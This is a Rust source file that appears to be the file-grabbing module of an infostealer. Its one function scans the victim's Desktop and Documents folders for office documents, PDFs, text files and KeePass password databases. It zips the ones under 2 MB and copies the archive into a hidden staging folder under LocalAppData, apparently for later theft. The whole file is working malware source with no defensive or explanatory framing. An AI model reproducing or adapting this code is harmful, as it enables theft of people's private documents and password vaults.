use std::fs::*;
use std::io::*;
use walkdir::WalkDir;
use zip::write::*;

pub fn grab_data() -> Option<String> {
    let filename = format!("{}\\sensfiles.zip", &std::env::var("TEMP").unwrap());
    let path = std::path::Path::new(&filename);

    let file = std::fs::File::create(&path).unwrap();

    let mut zip_writer = zip::ZipWriter::new(file);
    let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);

    let mut paths = vec![];

    paths.push(format!(
        "{}\\Desktop\\",
        std::env::var("USERPROFILE").unwrap()
    ));

    
    paths.push(format!(
        "{}\\Documents\\",
        std::env::var("USERPROFILE").unwrap()
    ));


    let mut valid_extensions = vec![];
    valid_extensions.push(".txt");
    valid_extensions.push(".kdbx");
    valid_extensions.push(".pdf");
    valid_extensions.push(".doc");
    valid_extensions.push(".docx");
    valid_extensions.push(".xls");
    valid_extensions.push(".xlsx");
    valid_extensions.push(".ppt");
    valid_extensions.push(".pptx");
    valid_extensions.push(".odt");
    valid_extensions.push(".odp");


    for path in paths {
        if std::path::Path::new(&path).exists() {
            for entry in WalkDir::new(&path)
                .max_depth(1)
                .into_iter()
                .filter_map(move |f| f.ok())
            {
                if let Ok(f) = &mut File::open(entry.path()) {
                    let mut buffer: Vec<u8> = match &f.metadata() {
                        Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                        Err(_) => Vec::new(),
                    };

                    if !valid_extensions
                        .iter()
                        .any(|&suffix| entry.file_name().to_str().unwrap().ends_with(suffix))
                    {
                        continue;
                    }

                    if buffer.capacity() >= 2097152  {
                        println!(
                            "{} is too large to be included in the archive",
                            entry.file_name().to_str().unwrap()
                        );
                        continue;
                    }

                    unsafe {
                        crate::FILES += 1;
                    }

                    if f.read_to_end(&mut buffer).is_ok()
                        && zip_writer
                            .start_file(entry.file_name().to_str().unwrap(), options)
                            .is_ok()
                    {
                        let _ = zip_writer.write_all(&buffer);
                    }
                }
            }
        }
    }

    zip_writer.finish().ok()?;

    unsafe {
        if crate::FILES > 0 {
            std::fs::copy(
                filename,
                format!(
                    "{}\\logscx\\sensfiles.zip",
                    &std::env::var("LOCALAPPDATA").unwrap()
                ),
            )
            .ok();
        }
    }
    Some("".to_string())
}
